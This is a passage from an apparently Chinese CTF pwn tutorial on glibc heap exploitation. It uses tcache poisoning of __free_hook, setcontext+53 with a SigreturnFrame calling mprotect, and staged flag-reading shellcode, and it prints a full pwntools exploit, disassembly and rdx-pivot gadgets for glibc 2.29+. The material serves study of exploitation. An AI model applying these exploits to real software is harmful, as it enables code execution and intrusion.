<span class="s1">        xor rdi,rdi</span>
<span class="s1">        mov rsi,</span><span class="si">%d</span><span class="s1"></span>
<span class="s1">        mov edx,0x1000</span>

<span class="s1">        mov eax,0</span>
<span class="s1">        syscall</span>

<span class="s1">        jmp rsi</span>
<span class="s1">        '''</span> <span class="o">%</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'setcontext'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">53</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">))</span>
</pre></div>
<p>这里需要解释一下这段shellcode是什么意思，我们想用mprotect函数开辟一段可读可写可执行的区域，但是mprotect函数的第一个参数，必须要页对齐，而%d的功能，是将常数加载到寄存器 <code>rsi</code> 中，<code>%d</code> 通过 Python 的字符串格式化来替换。这里的 <code>%d</code> 是由 <code>libc.sym['__free_hook'] &amp; 0xFFFFFFFFFFFFF000</code> 表达式计算得出的值。这个值是 <code>__free_hook</code> 的地址按页对齐的结果。</p>
<p>然后布置好free_hook的值。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235142-8d11f300-8268-1.png"/></p>
<p>把chunk1里面放上frame结构体，这样我们free1的时候就会按照frame的情况进行改写，注意把rip改写成mprotect，这样下一句执行语句就是mprotect，然后把栈迁移到free_hook加8的位置，那下一步进入的其实就是我们放的shellcode1</p>
<pre><code>frame = SigreturnFrame(kernel='amd64')
frame.rsp = libc.sym['__free_hook'] + 8
frame.rip = libc.sym['mprotect']
frame.rdi = libc.sym['__free_hook'] &amp; 0xFFFFFFFFFFFFF000
frame.rsi = 0x2000
frame.rdx = 7
edit(1, bytes(frame))
free(1)</code></pre>
<p>我们把断点下在free函数上，调试看看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235158-9647a67c-8268-1.png"/></p>
<p>这个时候会跳转到free_hook函数上面，而这里被我们放上了setcontext函数加53</p>
<p>接着往下走</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235215-a0d21082-8268-1.png"/></p>
<p>setcontext结束之后，它的rip被我们改成了mprotect函数，剩下的寄存器也都按照我们的要求写好了，接着往下就可以把包括free_hook的那一大段都改成可读可写可执行</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235234-abadeeae-8268-1.png"/></p>
<p>再次ret的时候，就会回到我们写入shellcode1的位置了，我们当然可以在这里就放上orw，但是有的时候长度不够的情况下，就可以按照这个shellcode进行编写，调用read，和跳转，往别的地方写入shellcode，然后在跳过去</p>
<div class="highlight"><pre><span></span><span class="n">shellcode2</span> <span class="o">=</span> <span class="s1">'''</span>
<span class="s1">mov rax, 0x67616c662f2e ;// ./flag</span>
<span class="s1">push rax</span>

<span class="s1">mov rdi, rsp ;// /flag</span>
<span class="s1">mov rsi, 0 ;// O_RDONLY</span>
<span class="s1">xor rdx, rdx ;</span>
<span class="s1">mov rax, 2 ;// SYS_open</span>
<span class="s1">syscall</span>

<span class="s1">mov rdi, rax ;// fd </span>
<span class="s1">mov rsi,rsp  ;</span>
<span class="s1">mov rdx, 1024 ;// nbytes</span>
<span class="s1">mov rax,0 ;// SYS_read</span>
<span class="s1">syscall</span>

<span class="s1">mov rdi, 1 ;// fd </span>
<span class="s1">mov rsi, rsp ;// buf</span>
<span class="s1">mov rdx, rax ;// count </span>
<span class="s1">mov rax, 1 ;// SYS_write</span>
<span class="s1">syscall</span>

<span class="s1">mov rdi, 123 ;// error_code</span>
<span class="s1">mov rax, 60</span>
<span class="s1">syscall</span>
<span class="s1">'''</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode2</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p>最后附上完整代码</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"libc.so.6"</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">"/home/gets/pwn/study/heap/setcontext/ld-linux-x86-64.so.2"</span><span class="p">,</span> <span class="s2">"./pwn"</span><span class="p">],</span>
            <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">"LD_PRELOAD"</span><span class="p">:</span><span class="s2">"/home/gets/pwn/study/heap/setcontext/libc.so.6"</span><span class="p">})</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"length:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"content:"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"4"</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3afca0</span>
<span class="n">info</span><span class="p">(</span><span class="s2">"libc base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">shellcode1</span> <span class="o">=</span> <span class="s1">'''</span>
<span class="s1">        xor rdi,rdi</span>
<span class="s1">        mov rsi,</span><span class="si">%d</span><span class="s1"></span>
<span class="s1">        mov edx,0x1000</span>

<span class="s1">        mov eax,0</span>
<span class="s1">        syscall</span>

<span class="s1">        jmp rsi</span>
<span class="s1">        '''</span> <span class="o">%</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'setcontext'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">53</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">))</span>

<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'mprotect'</span><span class="p">]</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x2000</span>
<span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">7</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>

<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">shellcode2</span> <span class="o">=</span> <span class="s1">'''</span>
<span class="s1">mov rax, 0x67616c662f2e ;// ./flag</span>
<span class="s1">push rax</span>

<span class="s1">mov rdi, rsp ;// /flag</span>
<span class="s1">mov rsi, 0 ;// O_RDONLY</span>
<span class="s1">xor rdx, rdx ;</span>
<span class="s1">mov rax, 2 ;// SYS_open</span>
<span class="s1">syscall</span>

<span class="s1">mov rdi, rax ;// fd </span>
<span class="s1">mov rsi,rsp  ;</span>
<span class="s1">mov rdx, 1024 ;// nbytes</span>
<span class="s1">mov rax,0 ;// SYS_read</span>
<span class="s1">syscall</span>

<span class="s1">mov rdi, 1 ;// fd </span>
<span class="s1">mov rsi, rsp ;// buf</span>
<span class="s1">mov rdx, rax ;// count </span>
<span class="s1">mov rax, 1 ;// SYS_write</span>
<span class="s1">syscall</span>

<span class="s1">mov rdi, 123 ;// error_code</span>
<span class="s1">mov rax, 60</span>
<span class="s1">syscall</span>
<span class="s1">'''</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode2</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p>当然，直接走rop链也是完全没有问题的，这里就不再过多赘述</p>
<h2 data-content="1" id="499dd376836583fa493eb6992d4a79d1">2.29及以上</h2>
<p>在2.29以上的setcontext函数则是有所变化</p>
<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">setcontext</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0x7f7775c5bcf0</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">&gt;</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">u</span> <span class="mh">0x7f7775c5bcf0</span> <span class="mi">20</span>
 <span class="err">►</span> <span class="mh">0x7f7775c5bcf0</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">&gt;</span>        <span class="n">push</span>   <span class="n">rdi</span>
   <span class="mh">0x7f7775c5bcf1</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span>      <span class="n">lea</span>    <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x128</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bcf8</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>      <span class="n">xor</span>    <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>               <span class="n">EDX</span> <span class="o">=&gt;</span> <span class="mi">0</span>
   <span class="mh">0x7f7775c5bcfa</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span> <span class="mi">2</span>                 <span class="n">EDI</span> <span class="o">=&gt;</span> <span class="mi">2</span>
   <span class="mh">0x7f7775c5bcff</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r10d</span><span class="p">,</span> <span class="mi">8</span>                <span class="n">R10D</span> <span class="o">=&gt;</span> <span class="mi">8</span>
   <span class="mh">0x7f7775c5bd05</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span> <span class="mh">0xe</span>               <span class="n">EAX</span> <span class="o">=&gt;</span> <span class="mh">0xe</span>
   <span class="mh">0x7f7775c5bd0a</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>     <span class="n">syscall</span>
   <span class="mh">0x7f7775c5bd0c</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>     <span class="n">pop</span>    <span class="n">rdx</span>
   <span class="mh">0x7f7775c5bd0d</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;</span>     <span class="n">cmp</span>    <span class="n">rax</span><span class="p">,</span> <span class="o">-</span><span class="mh">0xfff</span>
   <span class="mh">0x7f7775c5bd13</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;</span>     <span class="n">jae</span>    <span class="n">setcontext</span><span class="o">+</span><span class="mi">128</span>              <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;</span>

   <span class="mh">0x7f7775c5bd15</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd1c</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>     <span class="n">fldenv</span> <span class="p">[</span><span class="n">rcx</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd1e</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;</span>     <span class="n">ldmxcsr</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x1c0</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd25</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rsp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd2c</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd33</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">67</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd37</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r12</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd3b</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r13</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd3f</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">79</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r14</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd43</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">83</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r15</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd47</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd4e</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">94</span><span class="o">&gt;</span>     <span class="n">push</span>   <span class="n">rcx</span>
   <span class="mh">0x7f7775c5bd4f</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">95</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd53</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">99</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd57</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">103</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd5e</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">110</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">r8</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd62</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">114</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">r9</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd66</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">118</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">]</span>
   <span class="mh">0x7f7775c5bd6d</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">125</span><span class="o">&gt;</span>    <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                            <span class="n">EAX</span> <span class="o">=&gt;</span> <span class="mi">0</span>
   <span class="mh">0x7f7775c5bd6f</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;</span>    <span class="n">ret</span>
   <span class="mh">0x7f7775c5bd70</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x36f0f9</span><span class="p">]</span>     <span class="n">RCX</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x7f7775fcae70</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mh">0xffffffffffffff80</span>
   <span class="mh">0x7f7775c5bd77</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;</span>    <span class="n">neg</span>    <span class="n">eax</span>
   <span class="mh">0x7f7775c5bd79</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">137</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="nl">fs</span><span class="p">:[</span><span class="n">rcx</span><span class="p">],</span> <span class="n">eax</span>
   <span class="mh">0x7f7775c5bd7c</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;</span>    <span class="n">or</span>     <span class="n">rax</span><span class="p">,</span> <span class="mh">0xffffffffffffffff</span>
   <span class="mh">0x7f7775c5bd80</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">144</span><span class="o">&gt;</span>    <span class="n">ret</span>
</pre></div>
<p>可以看到，我们现在的setcontext函数是依靠rdx进行传参，这就意味着我们调用free函数的时候，控制的rdi寄存器对我们的劫持没有了什么用，</p>
<p>很容易想到，我们可以先调用一些gadget，使得rdi与rdx互相转换，但是不幸的是，正常转换的gadget只能劫持一次程序执行流，这也就是说，我们只能进行一次转换，再之后没有办法利用SigreturnFrame结构体进行寄存器的改写了，所有我们需要一种特殊的gadget，这种gadget可以达成两个效果，修改和再一次劫持程序执行流</p>
<p>一般来说，我们会尝试寻找这样两种gadget</p>
<pre><code>mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax;
mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20];</code></pre>
<p>这两个gadget可以同时达到上述两种效果，一个依靠jmp语句，一个依靠call语句，还是这道题目，我们尝试用这两个gadget都写一下exp</p>
<h3 data-content="1" id="aebca588c9a0b8bf149daae522095742">gadget1</h3>
<p>前面的泄露就不再多说，此处使用的是Ubuntu 8.4.0-1ubuntu1~18.04的libc，所以在劫持tcachebins的时候要注意，多释放一个堆块，因为这个版本往上的，都是通过tcachebins结构体记录的堆块数量来确定tcachebins链表的，而不是之前那种仅仅依靠fd指针</p>
<p>前面的泄露就不再多说，直接从后面的gadget开始，先用mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax;演示一下</p>
<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3b6be0</span>
<span class="n">info</span><span class="p">(</span><span class="s2">"libc base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
